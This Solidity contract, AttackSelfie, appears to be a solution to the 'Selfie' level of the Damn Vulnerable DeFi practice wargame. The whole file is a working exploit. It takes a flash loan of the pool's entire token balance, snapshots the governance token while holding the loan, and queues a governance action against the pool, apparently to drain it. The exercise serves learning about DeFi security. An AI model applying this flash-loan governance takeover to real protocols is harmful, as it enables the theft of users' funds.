// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract AttackSelfie is IERC3156FlashBorrower {
    SimpleGovernance govern;
    SelfiePool pool;
    uint256 public actionId;

    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(SimpleGovernance _govern, SelfiePool _pool) {
        govern = _govern;
        pool = _pool;
    }

    function attack(address token, bytes calldata data) external {
        uint256 balance = pool.maxFlashLoan(token);
        pool.flashLoan(IERC3156FlashBorrower(this), token, balance, data);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        ERC20Snapshot(token).approve(address(pool), amount);

        DamnValuableTokenSnapshot(token).snapshot();
        actionId = govern.queueAction(address(pool), 0, data);

        return CALLBACK_SUCCESS;
    }
}
